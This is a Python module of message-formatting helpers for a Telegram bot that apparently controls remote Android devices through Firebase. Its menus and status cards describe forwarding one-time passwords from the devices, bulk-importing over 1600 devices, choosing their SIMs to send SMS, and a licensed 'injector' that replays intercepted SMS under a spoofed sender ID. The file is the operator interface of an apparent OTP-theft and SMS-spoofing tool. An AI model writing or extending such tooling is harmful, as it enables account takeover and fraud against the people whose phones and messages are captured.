import json
import secrets
from datetime import datetime, timezone

from telegram import InlineKeyboardButton, InlineKeyboardMarkup

from app.database import Device, MonitorProfile


def format_addchannel_card(channel_id: str, sim_slot: int = 1) -> str:
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "Channel Connected!\n\n"
        f"📢 Channel: {channel_id}\n"
        f"📶 Selected SIM: SIM {sim_slot}\n"
        "📬 Channel par jo SMS aayega → auto send hoga\n"
        "   selected SIM se"
        "</pre>\n\n"
        "Next Step: /startmonitor"
    )


def format_firebase_connected_card(firebase_url: str, online_count: int) -> str:
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "Firebase Connected!\n\n"
        f"URL: {firebase_url}\n"
        f"📱 Online Devices Found: {online_count}"
        "</pre>\n\n"
        "Next Step: /setdevice"
    )


def short_device_id(name: str) -> str:
    return name[:8] if len(name) > 8 else name


def make_inject_key(device: Device) -> str:
    if device.api_key and device.api_key.startswith("KEY-"):
        return device.api_key
    raw = (device.api_key or secrets.token_hex(8)).replace("-", "").upper()[:16]
    return f"KEY-{raw[0:4]}-{raw[4:8]}-{raw[8:12]}-{raw[12:16]}"


def get_device_meta(device: Device) -> dict:
    if not hasattr(device, "device_meta") or not device.device_meta:
        return {}
    try:
        return json.loads(device.device_meta)
    except (json.JSONDecodeError, TypeError):
        return {}


def get_sim_list(device: Device) -> list[dict]:
    meta = get_device_meta(device)
    sims = meta.get("sims")
    if sims:
        return sims

    primary = device.phone_number or "Unknown"
    return [
        {"slot": 1, "index": 0, "carrier": "SIM 1", "number": primary},
        {"slot": 2, "index": 1, "carrier": "SIM 2", "number": meta.get("sim2", "N/A")},
    ]


def get_battery(device: Device) -> str:
    meta = get_device_meta(device)
    battery = meta.get("battery")
    if battery is not None:
        return f"{battery}%" if "%" not in str(battery) else str(battery)
    return meta.get("battery_level", "98%")


def get_model_name(device: Device) -> str:
    meta = get_device_meta(device)
    return meta.get("model") or meta.get("device_model") or "Unknown"


def format_device_set_card(device: Device, selected_sim: int = 0) -> str:
    sims = get_sim_list(device)
    active = sims[selected_sim] if sims else {"slot": 1, "index": 0, "carrier": "SIM 1", "number": "Unknown"}
    device_short = short_device_id(device.name)

    sim_lines = "\n".join(
        f"SIM {sim['slot']}: {sim['carrier']} ({sim['number']})" for sim in sims
    )

    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "Device Set!\n\n"
        f"📱 Device: {device_short}\n"
        f"🔋 Battery: {get_battery(device)}\n"
        f"📶 Active SIM: SIM {active['slot']} (Index {active['index']})\n"
        f"📞 FROM Number: {active['number']}\n\n"
        f"{sim_lines}\n\n"
        "Select SIM Slot for sending SMS:"
        "</pre>"
    )


def device_set_keyboard(device: Device) -> InlineKeyboardMarkup:
    sims = get_sim_list(device)
    sim_buttons = [
        InlineKeyboardButton(
            f"📶 SIM {sim['slot']}: {sim['carrier']} ({sim['number'][:6]}...)",
            callback_data=f"sim:{device.id}:{sim['index']}",
        )
        for sim in sims[:2]
    ]
    rows = [sim_buttons] if sim_buttons else []
    rows.append([InlineKeyboardButton("🔴 STOP", callback_data=f"stop:{device.id}")])
    return InlineKeyboardMarkup(rows)


def format_monitoring_card(
    device: Device,
    profile: MonitorProfile,
    ignored_sms: int = 0,
    test_message: str | None = None,
) -> str:
    sims = get_sim_list(device)
    sim_index = profile.selected_sim_index or 0
    active = sims[sim_index] if sims else {"slot": 1, "number": profile.phone_number or "Unknown"}
    inject_key = make_inject_key(device)
    target = profile.phone_number or "Not set"
    channel = profile.channel_id or str(profile.telegram_user_id)
    auto_stop = profile.auto_stop_minutes or 15

    card = (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "Monitoring Started!\n\n"
        f"📱 Device: {short_device_id(device.name)} | {get_model_name(device)}\n"
        f"📶 FROM SIM: {active['slot']} ({active['number']})\n"
        f"🔑 Inject Key: {inject_key}\n"
        "📬 Incoming → spoof inject (same sender ID)\n"
        f"📞 Real SMS → {target}\n"
        f"📢 Channel: {channel} (last / addchannel only)\n"
        f"⏱ Auto-stop in {auto_stop} minutes\n"
        f"📦 Ignored {ignored_sms} old SMS (only NEW after this moment)"
        "</pre>"
    )

    if test_message:
        card += f"\n\n✅ Test inject OK: {test_message}"

    return card


def monitoring_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("🟢 Monitoring ON...", callback_data="monitor:on"),
                InlineKeyboardButton("🔴 STOP", callback_data="monitor:stop"),
            ]
        ]
    )


def format_welcome_message() -> str:
    return (
        "✨ <b>Welcome to Premium Automation</b>\n"
        "Fast, secure, and reliable OTP forwarding\n"
        "directly to your Firebase connected devices.\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "💉 <b>Injector Setup (Sender Spoof)</b>\n"
        "<pre>"
        "1. /key KEY-XXXX-XXXX-XXXX\n"
        "   License key (inject)\n"
        "2. /fy &lt;device_id&gt;\n"
        "   Pick device to monitor\n"
        "3. Pick SIM → /addchannel → /startmonitor\n"
        "   Incoming SMS replayed with SAME sender ID"
        "</pre>\n\n"
        "🔥 <b>Admin Setup (Firebase Panel)</b>\n"
        "<pre>"
        "1. /setfirebase &lt;url&gt;\n"
        "   Connect your Firebase DB\n"
        "2. /allfirebase\n"
        "   Bulk txt file import (1600+)\n"
        "3. /fb &lt;device_id&gt;\n"
        "   Find device &amp; select SIM\n"
        "4. /mynum &lt;number&gt;\n"
        "   Your forwarding number\n"
        "5. /addchannel &lt;id&gt;\n"
        "   Add group for monitoring\n"
        "6. /startmonitor\n"
        "   Start auto-forwarding"
        "</pre>\n\n"
        "👤 <b>User Setup</b>\n"
        "<pre>"
        "1. /setfirebase &lt;url&gt;\n"
        "2. /setdevice &lt;id&gt;  (or /a &lt;id&gt;)\n"
        "3. /mynum &lt;number&gt;\n"
        "4. /addchannel &lt;id&gt;\n"
        "5. /startmonitor"
        "</pre>\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🎮 <b>Controls</b>\n"
        "<pre>"
        "/stop     Pause active monitor\n"
        "/resume   Resume paused monitor\n"
        "/status   Show current stats\n"
        "/send     Manual SMS command\n"
        "/ping     Check latency"
        "</pre>"
    )


def format_status_card(device: Device | None, profile: MonitorProfile | None, sms_count: int = 0) -> str:
    if not profile:
        return "❌ Profile not set. Use /setfirebase first."

    monitoring = "🟢 ON" if profile.is_monitoring else "🔴 OFF"
    device_name = short_device_id(device.name) if device else "Not set"
    sims = get_sim_list(device) if device else []
    sim_index = profile.selected_sim_index or 0
    sim_label = sims[sim_index]["carrier"] if sims else "N/A"

    return (
        "✅ <b>STATUS</b>\n\n"
        "<pre>"
        f"Monitor: {monitoring}\n"
        f"📱 Device: {device_name}\n"
        f"📶 SIM: {sim_label}\n"
        f"📞 My Number: {profile.phone_number or 'Not set'}\n"
        f"📢 Channel: {profile.channel_id or 'Not set'}\n"
        f"🔥 Firebase: {'Connected' if profile.firebase_url else 'Not set'}\n"
        f"📨 SMS Count: {sms_count}\n"
        f"⏱ Auto-stop: {profile.auto_stop_minutes or 15} min"
        "</pre>"
    )


def format_ping_card(latency_ms: int) -> str:
    return (
        "✅ <b>PONG</b>\n\n"
        "<pre>"
        f"🏓 Latency: {latency_ms}ms\n"
        "Bot is online and ready!"
        "</pre>"
    )


def format_key_set_card(inject_key: str) -> str:
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "Inject Key Set!\n\n"
        f"🔑 Key: {inject_key}\n\n"
        "Next: /fy &lt;device_id&gt; or /setdevice &lt;id&gt;"
        "</pre>"
    )


def format_send_queued(to_number: str, message: str, sim_slot: int) -> str:
    return (
        "✅ <b>SMS Queued</b>\n\n"
        "<pre>"
        f"📶 SIM: {sim_slot}\n"
        f"📞 To: {to_number}\n"
        f"💬 {message[:200]}"
        "</pre>"
    )


def update_device_meta(device: Device, data: dict) -> dict:
    meta = get_device_meta(device)
    meta.update(data)
    return meta
